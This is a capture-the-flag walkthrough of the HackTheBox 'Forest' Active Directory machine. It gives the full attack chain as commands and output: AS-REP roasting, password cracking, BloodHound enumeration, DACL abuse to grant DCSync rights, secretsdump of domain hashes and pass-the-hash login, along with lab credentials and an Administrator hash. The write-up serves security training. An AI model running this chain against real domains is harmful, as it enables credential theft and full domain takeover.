---
title: "[HacktTheBox] walkthrough: Forest (Active Directory)"
date: 2025-10-03
categories: [hackthebox]
tags: [htb, Windows, AD]
---

![7](/assets/images/hackthebox/forest/스크린샷%202025-10-06%20오후%2011.13.02.png)

## Info

- Platform: Hackthebox
- Machine Name: Forest
- Target IP/Host: 10.10.10.161
- OS / Version: Windows (AD)
- Difficulty / Category: Easy

## Overview

It is a basic Active Directory machine that can be attacked using AS-REP Roasting, BloodHound, DACL abuse, DCSync.

## Recon & Enumeration

First I scanned with `nmap`. 

```
sudo nmap 10.10.10.161 -n -A --min-rate 3000
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 00:17 KST                                                                             00:18:38 [16/121]
Nmap scan report for 10.10.10.161
Host is up (0.21s latency).          
                                       
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-10-02 15:24:54Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped                                                                                                                                    
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-10-02T15:25:14
|_  start_date: 2025-10-02T15:19:30
|_clock-skew: mean: 2h26m51s, deviation: 4h02m31s, median: 6m49s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-10-02T08:25:13-07:00

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   247.55 ms 10.10.14.1
2   247.85 ms 10.10.10.161
```

You can obtain the domain name: htb.local and the FQDN: FOREST.htb.local.

Then add them to the `/etc/hosts` file to match the IP address.

```
echo '10.10.10.161 htb.local FOREST.htb.local FOREST' | sudo tee -a /etc/hosts
```

I tried SMB null-session login with `nxc`, but it failed.
```
nxc smb 10.10.10.161 -u "" -p ""
```

I then tried LDAP anonymous bind, and it succeeded. So I retrieved users using the --users flag.
```
nxc ldap 10.10.10.161 -u "" -p "" --users
```

![1](/assets/images/hackthebox/forest/스크린샷%202025-10-03%20오전%2012.38.43.png)

user list:
```
...
sebastien
lucinda
svc-alfresco
andy
mark
santi
...
```

## Initial Access

I tried AS-REP Roasting with the user list by `impacket-GetNPUsers`.
```
┌──(kali㉿kali)-[~/htb/Forest/recon]
└─$ impacket-GetNPUsers htb.local/ -request -usersfile userlist -dc-ip 10.10.10.161
```

![2](/assets/images/hackthebox/forest/스크린샷%202025-10-03%20오전%2012.42.32.png)

I obtained `svc-alfresco`'s AS-REP response and cracked it with John the Ripper.
```
┌──(kali㉿kali)-[~/htb/Forest/recon]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt svc-alresco_hash   
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:01 DONE (2025-10-03 00:41) 0.5102g/s 2085Kp/s 2085Kc/s 2085KC/s s521379846..s2698813
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

You can log in as svc-alfresco with evil-winrm and find `user.txt` at C:\Users\svc-alfresco\Desktop.
```
┌──(kali㉿kali)-[~/htb/Forest]
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

## Privilege Escalation

Using BloodHound, you can enumerate AD GPO information and find an attack path to the `Administrator` account.

BloodHound can be with `nxc` or `bloodhound-python`, I used `nxc`.

```
# using bloodHound-python
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -v --zip -c All -dc htb.local -ns 10.10.10.161

# using nxc
nxc ldap 10.10.10.161 -u svc-alfresco -p s3rvice --bloodhound --collection All -d htb.local --dns-server 10.10.10.161
```

![4](/assets/images/hackthebox/forest/스크린샷%202025-10-04%20오후%203.05.11.png)

If you upload the `.zip` file to BloodHound, you can find the attack path to the `Administrator` account like this.(If such a path exists.)

![3](/assets/images/hackthebox/forest/스크린샷%202025-10-04%20오후%202.59.57.png)

`svc-alfresco` is member of the `Account Operators` group and Account Operators have the `GenericAll` permission on the `Exchange Windows Permissions` group that have `WriteDacl` permission on the domain.

First I abused the `GenericAll` permission to add `svc-alfresco` to the `Exchange Windows Permissions` group.

```
net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U htb.local/svc-alfresco%s3rvice -S 10.10.10.161
```

![5](/assets/images/hackthebox/forest/스크린샷%202025-10-04%20오후%203.18.11.png)
The command succeeded.

Second, I abused the `WriteDacl` permission to grant `DCSync` rights to the `Exchange Windows Permissions` group on the domain.

```
┌──(kali㉿kali)-[~/htb/Forest]                                        
└─$ impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' htb.local/'svc-alfresco':'s3rvice'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies             

[*] DACL backed up to dacledit-20251004-151605.bak         
[*] DACL modified successfully! 
```

Then, after the `Exchange Windows Permissions` group had `DCSync` rights, I performed DCSync using `impacket-secretsdump`.

```
┌──(kali㉿kali)-[~/htb/Forest]
└─$ impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.10.10.161
```

![6](/assets/images/hackthebox/forest/스크린샷%202025-10-04%20오후%203.21.04.png)

I obtained the Administrator's hash, then logged in with pass-the-hash using evil-winrm.
```
┌──(kali㉿kali)-[~/htb/Forest]
└─$ evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

I found `root.txt` at C:\Users\Administrator\Desktop.